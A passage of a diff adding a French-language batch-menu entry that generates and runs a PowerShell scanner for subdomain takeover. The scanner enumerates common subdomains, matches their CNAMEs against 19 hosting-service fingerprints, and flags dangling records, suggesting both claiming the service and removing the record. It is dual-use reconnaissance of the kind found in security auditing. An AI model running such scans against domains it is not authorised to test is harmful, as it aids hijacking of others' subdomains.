+if exist "%SSRF_PS%" del "%SSRF_PS%"
+echo.
+pause
+goto cat_web
+
+:cyber_subdomain_takeover
+cls
+echo.
+echo  ===========================================================
+echo   SUBDOMAIN TAKEOVER - Detection
+echo  ===========================================================
+echo   Niveau : Intermediaire    Impact : CRITIQUE
+echo   Ce que ca fait : Certains sous-domaines pointent via CNAME
+echo   vers des services externes (GitHub Pages, S3, Heroku...) qui
+echo   ont ete supprimes. N'importe qui peut reclamer ce service et
+echo   servir du contenu malveillant sous le domaine officiel.
+echo   Exemple : dev.monsite.com pointe vers un GitHub Pages efface
+echo   -> un attaquant cree ce repo GitHub et prend le controle.
+echo  ===========================================================
+echo.
+set /p "TKO_DOM=Domaine racine cible (ex: monsite.com) : "
+if "%TKO_DOM%"=="" goto cat_web
+
+set "TKO_PS=%TEMP%\takeover.ps1"
+if exist "%TKO_PS%" del "%TKO_PS%"
+
+echo $domain = "!TKO_DOM!" > "%TKO_PS%"
+echo $ua = "Mozilla/5.0" >> "%TKO_PS%"
+echo $vulns = 0 >> "%TKO_PS%"
+echo $dangling = 0 >> "%TKO_PS%"
+echo. >> "%TKO_PS%"
+echo $fingerprints = @( >> "%TKO_PS%"
+echo    @{ Service='GitHub Pages';        CNAME=@('github.io','github.com');         Error='There isn''t a GitHub Pages site here|For root URLs|Did you mean to visit' }, >> "%TKO_PS%"
+echo    @{ Service='Heroku';              CNAME=@('herokuapp.com','herokudns.com');   Error='No such app|heroku\s*\|no-such-app' }, >> "%TKO_PS%"
+echo    @{ Service='Netlify';             CNAME=@('netlify.app','netlify.com');       Error='Not Found - Request ID|page not found|netlify.*not found' }, >> "%TKO_PS%"
+echo    @{ Service='AWS S3';              CNAME=@('s3.amazonaws.com','s3-website');   Error='NoSuchBucket|The specified bucket does not exist' }, >> "%TKO_PS%"
+echo    @{ Service='AWS Elastic Beanstalk'; CNAME=@('elasticbeanstalk.com');          Error='404.*EB|No Application Found|no such application' }, >> "%TKO_PS%"
+echo    @{ Service='Azure Blob Storage';  CNAME=@('blob.core.windows.net');           Error='The specified container does not exist|BlobNotFound|ResourceNotFound' }, >> "%TKO_PS%"
+echo    @{ Service='Azure CDN';           CNAME=@('azureedge.net','azure.com');       Error='The resource you are looking for has been removed' }, >> "%TKO_PS%"
+echo    @{ Service='Fastly';              CNAME=@('fastly.net');                      Error='Fastly error: unknown domain|Please check that this domain has been added' }, >> "%TKO_PS%"
+echo    @{ Service='Shopify';             CNAME=@('myshopify.com','shopify.com');     Error='Sorry, this shop is currently unavailable|only accessible to|shop is unavailable' }, >> "%TKO_PS%"
+echo    @{ Service='Ghost (Pro)';         CNAME=@('ghost.io','ghostchefs.com');       Error='The thing you were looking for is no longer here|404.*ghost' }, >> "%TKO_PS%"
+echo    @{ Service='HubSpot';             CNAME=@('hubspot.net','hubspotpagebuilder'); Error='Domain not configured|does not exist in our system|hs-sites' }, >> "%TKO_PS%"
+echo    @{ Service='Zendesk';             CNAME=@('zendesk.com','zendeskservice');    Error='Help Center Closed|Oops! This help center no longer exists' }, >> "%TKO_PS%"
+echo    @{ Service='Cargo Collective';    CNAME=@('cargocollective.com');             Error='If you''re moving your domain away from Cargo|404 Not Found.*cargo' }, >> "%TKO_PS%"
+echo    @{ Service='Tumblr';              CNAME=@('tumblr.com');                      Error='Whatever you were looking for doesn''t currently exist|There''s nothing here' }, >> "%TKO_PS%"
+echo    @{ Service='Squarespace';         CNAME=@('squarespace.com','sqsp.net');      Error='No Such Account|this domain is not connected to a Squarespace site' }, >> "%TKO_PS%"
+echo    @{ Service='Pantheon';            CNAME=@('pantheonsite.io','pantheon.io');   Error='404 error: unknown site|The gods are wise|pantheon.io' }, >> "%TKO_PS%"
+echo    @{ Service='Vercel';              CNAME=@('vercel.app','now.sh');             Error='The deployment could not be found|This deployment has been disabled|DEPLOYMENT_NOT_FOUND' }, >> "%TKO_PS%"
+echo    @{ Service='Surge.sh';            CNAME=@('surge.sh');                        Error='project not found|surge - 404' }, >> "%TKO_PS%"
+echo    @{ Service='Webflow';             CNAME=@('webflow.io','proxy.webflow.com'); Error='The page you are looking for doesn''t exist|page has moved|webflow.*404' } >> "%TKO_PS%"
+echo ) >> "%TKO_PS%"
+echo. >> "%TKO_PS%"
+echo $subs = @( >> "%TKO_PS%"
+echo    'www','api','dev','test','staging','beta','alpha','uat','qa','demo', >> "%TKO_PS%"
+echo    'old','legacy','v1','v2','v3','preview','sandbox','pre','preprod', >> "%TKO_PS%"
+echo    'admin','portal','dashboard','panel','manage','control', >> "%TKO_PS%"
+echo    'blog','news','shop','store','docs','wiki','help','support','kb', >> "%TKO_PS%"
+echo    'static','assets','cdn','media','files','downloads','img','images', >> "%TKO_PS%"
+echo    'mail','email','smtp','webmail','newsletter','m','mobile','app', >> "%TKO_PS%"
+echo    'status','monitor','health','metrics','analytics','track', >> "%TKO_PS%"
+echo    'git','repo','jenkins','ci','cd','build','deploy','devops', >> "%TKO_PS%"
+echo    'jobs','careers','about','contact','feedback','community' >> "%TKO_PS%"
+echo ) >> "%TKO_PS%"
+echo. >> "%TKO_PS%"
+echo Write-Host "" >> "%TKO_PS%"
+echo Write-Host "  Scan de $($subs.Count) sous-domaines pour $domain..." -f Cyan >> "%TKO_PS%"
+echo Write-Host "  Detection de 19 services (GitHub, S3, Heroku, Vercel...)" -f DarkGray >> "%TKO_PS%"
+echo Write-Host "" >> "%TKO_PS%"
+echo. >> "%TKO_PS%"
+echo foreach ($sub in $subs) { >> "%TKO_PS%"
+echo    $fqdn = "$sub.$domain" >> "%TKO_PS%"
+echo    try { >> "%TKO_PS%"
+echo        $dnsResult = Resolve-DnsName $fqdn -ErrorAction Stop >> "%TKO_PS%"
+echo        $cnames = $dnsResult | Where-Object { $_.Type -eq 'CNAME' } | Select-Object -ExpandProperty NameHost >> "%TKO_PS%"
+echo        $ips    = $dnsResult | Where-Object { $_.Type -eq 'A' }     | Select-Object -ExpandProperty IPAddress >> "%TKO_PS%"
+echo        if (-not $cnames) { continue } >> "%TKO_PS%"
+echo        $cnameStr = ($cnames -join ', ') >> "%TKO_PS%"
+echo        $matched = $false >> "%TKO_PS%"
+echo        foreach ($fp in $fingerprints) { >> "%TKO_PS%"
+echo            $hit = $false >> "%TKO_PS%"
+echo            foreach ($c in $cnames) { >> "%TKO_PS%"
+echo                foreach ($pattern in $fp.CNAME) { >> "%TKO_PS%"
+echo                    if ($c -match [regex]::Escape($pattern)) { $hit = $true; break } >> "%TKO_PS%"
+echo                } >> "%TKO_PS%"
+echo                if ($hit) { break } >> "%TKO_PS%"
+echo            } >> "%TKO_PS%"
+echo            if (-not $hit) { continue } >> "%TKO_PS%"
+echo            $matched = $true >> "%TKO_PS%"
+echo            Write-Host "  [CNAME] $fqdn" -f White -NoNewline >> "%TKO_PS%"
+echo            Write-Host " -> $cnameStr" -f Gray >> "%TKO_PS%"
+echo            Write-Host "         Service detecte : $($fp.Service)" -f Cyan >> "%TKO_PS%"
+echo            $confirmed = $false >> "%TKO_PS%"
+echo            foreach ($scheme in @('https','http')) { >> "%TKO_PS%"
+echo                try { >> "%TKO_PS%"
+echo                    $r = Invoke-WebRequest "$scheme`://$fqdn" -UserAgent $ua -TimeoutSec 8 -UseBasicParsing -EA Stop -MaximumRedirection 3 >> "%TKO_PS%"
+echo                    if ($r.Content -match $fp.Error) { >> "%TKO_PS%"
+echo                        Write-Host "         [!!!] TAKEOVER CONFIRME !" -f Red >> "%TKO_PS%"
+echo                        Write-Host "               Fingerprint trouve dans la reponse HTTP" -f Red >> "%TKO_PS%"
+echo                        Write-Host "               Action : Reclamez le service '$($fp.Service)'" -f Yellow >> "%TKO_PS%"
+echo                        Write-Host "               CNAME dangling : $cnameStr" -f Yellow >> "%TKO_PS%"
+echo                        $vulns++; $confirmed = $true; break >> "%TKO_PS%"
+echo                    } else { >> "%TKO_PS%"
+echo                        Write-Host "         [-] CNAME pointe vers $($fp.Service) mais le service repond (actif)" -f DarkGray >> "%TKO_PS%"
+echo                        $confirmed = $true; break >> "%TKO_PS%"
+echo                    } >> "%TKO_PS%"
+echo                } catch { } >> "%TKO_PS%"
+echo            } >> "%TKO_PS%"
+echo            if (-not $confirmed) { >> "%TKO_PS%"
+echo                Write-Host "         [~] CNAME dangling - Service ne repond pas (potentiellement vulnerable)" -f Yellow >> "%TKO_PS%"
+echo                $dangling++ >> "%TKO_PS%"
+echo            } >> "%TKO_PS%"
+echo            break >> "%TKO_PS%"
+echo        } >> "%TKO_PS%"
+echo        if (-not $matched) { >> "%TKO_PS%"
+echo            Write-Host "  [INFO] $fqdn -> CNAME: $cnameStr (service inconnu)" -f DarkGray >> "%TKO_PS%"
+echo        } >> "%TKO_PS%"
+echo    } catch { } >> "%TKO_PS%"
+echo } >> "%TKO_PS%"
+echo. >> "%TKO_PS%"
+echo Write-Host "" >> "%TKO_PS%"
+echo Write-Host "  ================================================" -f Cyan >> "%TKO_PS%"
+echo if ($vulns -gt 0) { >> "%TKO_PS%"
+echo    Write-Host "  [!!!] $vulns takeover(s) CONFIRME(S) !" -f Red >> "%TKO_PS%"
+echo    Write-Host "  Un attaquant peut servir du contenu sous votre domaine." -f Red >> "%TKO_PS%"
+echo    Write-Host "  Correction : Supprimez les enregistrements CNAME dangling" -f Yellow >> "%TKO_PS%"
+echo    Write-Host "  dans votre gestionnaire DNS." -f Yellow >> "%TKO_PS%"
+echo } elseif ($dangling -gt 0) { >> "%TKO_PS%"
+echo    Write-Host "  [~] $dangling CNAME(s) dangling detecte(s) - Service ne repond pas." -f Yellow >> "%TKO_PS%"
+echo    Write-Host "  Verifiez si ces services sont encore actifs." -f DarkGray >> "%TKO_PS%"
+echo } else { >> "%TKO_PS%"
+echo    Write-Host "  [OK] Aucun subdomain takeover detecte." -f Green >> "%TKO_PS%"
+echo } >> "%TKO_PS%"
+echo Write-Host "  ================================================" -f Cyan >> "%TKO_PS%"
+
+powershell -NoProfile -ExecutionPolicy Bypass -File "%TKO_PS%"
+if exist "%TKO_PS%" del "%TKO_PS%"
+echo.
+pause
+goto cat_web
 
 
 :cyber_security_report
